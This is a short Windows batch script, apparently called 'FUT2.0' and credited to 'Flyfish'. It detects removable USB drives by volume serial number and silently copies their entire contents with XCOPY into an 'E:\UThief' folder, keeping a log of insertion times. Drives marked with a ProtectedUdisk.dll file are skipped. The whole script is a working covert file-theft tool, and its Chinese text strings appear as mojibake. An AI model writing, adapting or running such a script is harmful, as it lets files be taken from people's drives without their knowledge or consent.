::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::    FUT2.0  Code by Flyfish
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
for %%a in (c d e f g h i j k l m n o p q r s t u v w x y z) do (
    for /f %%h in ('fsutil fsinfo drivetype %%a:^|findstr /i "Removable.* ¿ÉÒÆ¶¯"') do (
      set U=%%h
      call :Main
    )
)
GOTO :EOF
:Main
FOR /F "TOKENS=3" %%i IN ('FSUTIL FSINFO VOLUMEINFO %U%^|find "¾íÐòÁÐºÅ"') DO set A=%%i
FOR /F "delims=" %%i in ('type E:\UThief\%A%_id.txt') do set B=%%i
IF "%A%" == "%B%" (
   GOTO :EOF
   ) else (call :Run)
:Run
FOR /F "TOKENS=3" %%i IN ('FSUTIL FSINFO VOLUMEINFO %U%^|find "¾íÐòÁÐºÅ"') DO set A=%%i
ECHO %A%>E:\UThief\%A%_id.txt
IF EXIST %U%\ProtectedUdisk.dll (
   GOTO :EOF
   ) else (
           ECHO %Date% %TIME:~0,2%:%TIME:~3,2% ¼à²âµ½Çý¶¯Æ÷¡°%U%¡±²åÈë>>E:\UThief\%A%_Log.txt
           ECHO D|XCOPY /R /G /E /F /C /Y  %U%\*.* E:\UThief\%A%>>E:\UThief\%A%_Log.txt
           ECHO.>>E:\UThief\%A%_Log.txt)
         )
